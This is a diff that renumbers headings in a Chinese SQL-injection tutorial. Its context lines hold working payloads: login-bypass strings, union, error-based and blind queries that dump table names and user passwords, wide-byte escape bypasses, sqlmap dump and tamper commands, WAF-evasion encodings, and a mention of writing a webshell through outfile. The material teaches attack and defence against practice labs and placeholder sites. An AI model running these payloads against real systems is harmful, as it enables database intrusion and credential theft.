@@ -12,7 +12,7 @@
 
       1986年10月，美国国家标准协会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。
 
-### **常见****SQL****语句**
+### 1.2.1 **常见****SQL****语句**
 
 ```sql
 1、select（查）：select * from 表名；
@@ -50,9 +50,9 @@ id=1 or 1=1 ==> select * from 表名 where id=1 or 1=1;（注入后）
 
 6、权限足够的情况下甚至可以操作系统文件，执行系统命令等等。
 
-# SQL注入类型
+# 3 SQL注入类型
 
-## **根据注入方式分类**
+## 3.1 **根据注入方式分类**
 
 1、union注入 联合查询 
 
@@ -66,7 +66,7 @@ id=1 or 1=1 ==> select * from 表名 where id=1 or 1=1;（注入后）
 
 5、二次注入
 
-## 2.3 **根据注入点位置分类**
+## 3.2 **根据注入点位置分类**
 
 1、GET型注入
 
@@ -74,7 +74,7 @@ id=1 or 1=1 ==> select * from 表名 where id=1 or 1=1;（注入后）
 
 3、http头注入：Cookie注入、Host头注入、X-Forwarded-For注入
 
-## 2.4 **根据注入后****sql****语句的完整度分类**
+## 3.3 **根据注入后****sql****语句的完整度分类**
 
 内联式注入
 
@@ -94,7 +94,7 @@ id=1 or 1=1 ==> select * from 表名 where id=1 or 1=1;（注入后）
 ↓
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626627957000807.png)
-# 3. SQL注入万能密码
+# 4 SQL注入万能密码
 
 正常情况下的登录验证语句
 
@@ -107,7 +107,7 @@ $user = admin' or 1=1#
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626639431000283.png)
 脚本语言无法理解SQL语句，两者对查询语句处理不一致导致SQL注入，篡改了SQL语句原本逻辑，如上图。
 
-## 3.1 常用万能密码
+## 4.1. 常用万能密码
 
 |"or"a"="a|"or 1=1--|# -- --+|admin'--|
 |:----|:----|:----|:----|
@@ -115,9 +115,9 @@ $user = admin' or 1=1#
 |")or("a"="a|'or 1=1%00|admin' or 1=1/*|admin' or '1'='1'--|
 |'or 1=1--|'or 1=1/*|'or'='or'|admin' or 2=2#|
 
-# 4. SQL手工注入流程
+# 5. SQL手工注入流程
 
-## 4.1 **寻找注入点**
+## 5.1. **寻找注入点**
 
 判断某个链接是否存在SQL注入，可以通过对其传入的可控参数进行简单的构造，通过服务端返回的内容来判断有无注入。首先尝试在url中添加“'”观察是否会报错；随后通过添加 and 1=1或者and1=2进一步确认，如果“'”触发报错，则说明大概率为注入点，and 1=1返回原页面，and1=2返回空白或者报错，则基本证明此处为注入点。
 
@@ -155,7 +155,7 @@ $user = admin' or 1=1#
 
 [www.xxx.com/xxx.php?id=6/3](http://www.xxx.com/xxx.php?id=6/3)
 
-## 4.2 **确定字段个数**
+## 5.2. **确定字段个数**
 
 通过在参数后面插入“order by x#”来确定字段个数，直到“order by x#”正常显示并且“order by x+1#”报错为止，报错是说明x+1超过了字段个数，字段个数就是x
 
@@ -169,7 +169,7 @@ $user = admin' or 1=1#
 
 说明字段个数为3
 
-## 4.3 **确定字段回显位置**
+## 5.3. **确定字段回显位置**
 
 在参数后面添加“union select 1,2,3,…,x-1,x#”(x是字段个数），联合查询确定可回显位置
 
@@ -182,7 +182,7 @@ PS：联合查询时记得把前面的查询为空
 下图说明第2、3字段可回显
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626650780000301.png)
-## **判断数据库信息**
+## 5.4. **判断数据库信息**
 
 在回显位置插入数据库内置函数
 
@@ -195,7 +195,7 @@ PS：联合查询时记得把前面的查询为空
    [www.xxx.com/xxx.php?](http://www.xxx.com/xxx.php?) id=-2’%20union%20select%201,2,user()#
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626652538000944.png)
-## 4.4 **查询数据**
+## 5.5. **查询数据**
 
 mysql>5.0版本中，information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。如数据库名，数据表，表里的数据类型与访问权限等（这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面）。
 
@@ -216,15 +216,15 @@ table_schema=database()#
 ```
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626657809000369.png)
 
-# 5 SQL注入-联合查询
+# 6. SQL注入-联合查询
 
-## 5.1 联合查询概念
+## 6.1. 联合查询概念
 
 union联合查询算是最简单的一种注入了，也是最常见的。
 
 UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同。
 
-## 5.2 **union****注入特点**
+## 6.2. **union****注入特点**
 
 1. 有回显，可以看到某些字段的回显结果（通常）
 2. 猜解出字段数目
@@ -237,7 +237,7 @@ UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION�
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626667120000838.png)
 已知comment_id=-5的记录是不存在的，所以我们填写的数字将填充显示位。
 
-## 5.3 常用内置函数
+## 6.3. 常用内置函数
 
 version()——MySQL 版本
 
@@ -249,7 +249,7 @@ database()——数据库名
 
 @@version_compile_os——操作系统版本
 
-## 5.4 通过limit进行逐个注入
+## 6.4. 通过limit进行逐个注入
 
 ```sql
 逐个爆出库名：?id=-1' union select 1,schema_name,user() from information_schema.schemata limit 0,1 #
@@ -257,7 +257,7 @@ database()——数据库名
 逐个爆出字段名：?id=-1' union select 1,column_name,user() from information_schema.columns where table_name='表名' limit 0,1#
 爆出需要的字段值：?id=-1' union select 1,username,password from users limit 0,1#
 ```
-## 5.5 通过group_concat（）实现更高效的注入
+## 6.5. 通过group_concat（）实现更高效的注入
 
 ```sql
 一次爆出所有数据库名：?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata #
@@ -265,9 +265,9 @@ database()——数据库名
 一次爆出所有字段名：?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名’#
 一次爆出所有字段值：?id=-1' union select 1,group_concat(username,0x7c,password),3 from users#
 ```
-# 6 SQL注入-报错注入
+# 7. SQL注入-报错注入
 
-## 6.1 **报错注入特点**
+## 7.1. **报错注入特点**
 
 当存在注入但无正常回显时，可以使用报错注入，报错注入速度较快，两个重要函数：
 
@@ -275,7 +275,7 @@ concat（)、updatexml（），报错报的是xpath错误。XPath即为XML路径
 
 concat（）的作用是连接字符串，并促使updatexml（）报错，至少需要两个参数。updatexml（）的作用是报错，其中有三个参数。第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。
 
-## 6.2 **报错注入一般流程**
+## 7.2. **报错注入一般流程**
 
 **查询用户：**
 
@@ -304,24 +304,24 @@ sql-labs第五关对应报错注入，注入语句如下：
 ```
 注入效果如下：
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626679108000220.png)
-## 6.3 **其他报错注入**
+## 7.3. **其他报错注入**
 
 1. floor() 语句:and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
 
 floor函数和group by一起用时会发生冲突，导致报错。
 
 2. ExtractValue() 和upadtexml()用法差不多 语句:and extractvalue(1, concat(0x5c, (select user())));
-# 7 SQL注入-盲注
+# 8. SQL注入-盲注
 
-## 7.1 **布尔盲注**
+## 8.1. **布尔盲注**
 
-### 7.1.1 **特点**
+### 8.1.1. **特点**
 
 1. 在没有数据回显的情况下，可以存在不同的页面内容回显
 2. 通常逐个爆破猜解，效率偏低
 3. 思路：利用回显的不同推测SQL语句执行的结果是True还是False
 4. payload：select * from users where user='xx' and pass>'123'#'
-### 7.1.2 常用函数
+### 8.1.2. 常用函数
 
 ascii（）括号中的参数转化成相应的ascii码
 
@@ -333,7 +333,7 @@ length（）返回str字符串的长度
 
 left（database(),1） 取database字符串的左边第一个
 
-### 7.1.3 实操
+### 8.1.3. 实操
 
 **爆出数据库版本：**
 
@@ -348,9 +348,9 @@ and ascii(mid(user(),1,1))>96
 ```sql
 and ascii(mid((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>96
 ```
-## 7.2 **时间盲注**
+## 8.2. **时间盲注**
 
-### 7.2.1 特点
+### 8.2.1. 特点
 
 1. 页面不存在不同回显，但SQL语句被执行
 2. 逐个爆破猜解+时间延迟，效率最低
@@ -358,7 +358,7 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
 ```sql
 payload：If(ascii(substr(database(),1,1))>115,sleep(5),0)%23 //if 判断语句， 条件为假，执行 sleep
 ```
-### 7.2.2 常用函数
+### 8.2.2. 常用函数
 
 if(a,b,c) a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0
 
@@ -370,28 +370,28 @@ sleep（）执行挂起一段时间
 and if(mid(version(),1,1)=1,sleep(10),1)
 ```
 也可以和布尔盲注联合起来使用
-# 8 SQL注入-宽字节注入
+# 9. SQL注入-宽字节注入
 
-## 8.1 字符、字符集与字符序
+## 9.1. 字符、字符集与字符序
 
 1. 字符（character）是组成字符集（character set）的基本单位。
 2. 对字符赋予一个数值（encoding）来确定这个字符在该字符集中的位置。
 3. 字符序（collation）指同一字符集内字符间的比较规则。
-## 8.2 UTF-8
+## 9.2. UTF-8
 
 由于ASCII表示的字符只有128个，因此通常使用UNICODE编码，但用ASCII表示的字符使用UNICODE并不高效，所以出现了中间格式字符集，被称为通用转换格式，及UTF（Universal Transformation Format）。
 
-## 8.3 宽字节
+## 9.3. 宽字节
 
 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，这些编码中一个字符实际上占两字节。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。
 
-## 8.4 MYSQL的字符集转换过程
+## 9.4. MYSQL的字符集转换过程
 
 MySQL收到请求时，将请求数据从 character_set_client 转换为 character_set_connection；
 
 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集。宽字节注入发生的位置就是PHP发送请求到 MYSQL 时字符集使用 character_set_client 设置值进行了一次编码。
 
-## 8.5 宽字节注入原理
+## 9.5. 宽字节注入原理
 
 ASCII占一字节，GBK 占两字节，MYSQL默认字符集是GBK等宽字节字符集。%df' 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\'，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果字符集是默认状态，MYSQL会认为 %df%5c 是一个宽字符，也就是“縗”，也就是说：%df\' → %df%5c%27 → 縗'，被转义的单引号恢复正常了。利用宽字节是为了绕过转义，绕过之后的步骤跟其他注入方式一样。
 
@@ -400,7 +400,7 @@ ASCII占一字节，GBK 占两字节，MYSQL默认字符集是GBK等宽字节字
 ```sql
 ?id=1%df%27%20order%20by%203--+
 ```
-## 8.6 宽字节注入场景
+## 9.6. 宽字节注入场景
 
 1. 使用不安全的编码
 2. 对特殊符号进行转义（在mysql中，用于转义的函数有 addslashes，mysql_real_escape_string ， mysql_escape_string等）
@@ -419,16 +419,16 @@ sql-labs第32关对应宽字节注入，payload如下：
 ?id=1.1%df%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20--+
 ?id=1.1%df%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x75736572%20--+
 ```
-# 9 SQL注入-二次注入
+# 10. SQL注入-二次注入
 
-## 9.1 **二次注入原理**
+## 10.1. **二次注入原理**
 
 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。
 
 防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626704903000399.png)
-## 9.2 二次注入步骤
+## 10.2. 二次注入步骤
 
 **第一步：插入恶意数据**
 
@@ -438,7 +438,7 @@ sql-labs第32关对应宽字节注入，payload如下：
 
  开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
 
-## 9.3 实操
+## 10.3. 实操
 
 二次注入可以通过注册和登录功能来实现，先注册恶意账号”admin'#”，密码是123，如下：
 
@@ -455,13 +455,13 @@ sql-labs第32关对应宽字节注入，payload如下：
 
 
 
-# Sqlmap使用技巧
+# 11. Sqlmap使用技巧
 
-## Sqlmap介绍
+## 11.1. Sqlmap介绍
 
 sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来断。3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4）联合查询注入，可以使用union的情况下的注入。5）堆查询注入，可以同时执行多条语句的执行时的注入。
 
-## 检测注入点
+## 11.2. 检测注入点
 
 * 基本格式
 
@@ -477,7 +477,7 @@ sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现�
 
   sqlmap -r "D:\test\post.txt" -p id --dbms mysql    -p指定参数
 
-## **指定不同格式的目标**
+## 11.3. **指定不同格式的目标**
 
 -d DIRECT 直接连接到数据库。
 
@@ -491,7 +491,7 @@ sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现�
 
 -c CONFIGFILE 从INI配置文件中加载选项。
 
-## 查数据
+## 11.4. 查数据
 
 * 查看数据库
 
@@ -510,7 +510,7 @@ sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现�
    sqlmap -u "http://www.xxx.com/xxx.php?id=1" -D db -T table -C c1,c2 --dump  (-C指定字段）
 
 
-## 其他参数
+## 11.5. 其他参数
 
 --is-dba  当前用户权限（是否为root权限）
 
@@ -528,7 +528,7 @@ sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现�
 
 --time-sec=TIMESEC   DBMS响应的延迟时间（默认为5秒）
 
-## tamper
+## 11.6. tamper
 
 使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。
 
@@ -537,9 +537,9 @@ sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现�
 **以下为常用tamper脚本列表：**
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626730525000858.png)
-# SQL注入高级用法
+# 12. SQL注入高级用法
 
-## 提权
+## 12.1. 提权
 
 * 在权限足够的情况下，通过SQL注入进行文件的读写：
 
@@ -561,7 +561,7 @@ outfile适合写入一句话木马，语句如下：
 * secure-file-priv 的限制
 
 ![image](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/media/1634051626736010000842.png)
-## WAF绕过
+## 12.2. WAF绕过
 
 1. 应对简单的非迭代的将select、or等关键字替换为空字符串的防御
 ```sql
@@ -600,7 +600,7 @@ or 1=1——%6f%72%20%31%3d%31
         * 科学计数法绕过：where username=1e1union select
         * =、<、>被限制：where id in (1,2)、where id between 1 and 3、like
         * access中使用dlookup绕过select from被限制：(user=12',info=dlookup('[user]','userinfo','[id]=1')%00)
-# SQL注入防御
+# 13. SQL注入防御
 
 1. **（简单又有效的方法）PreparedStatement**
 
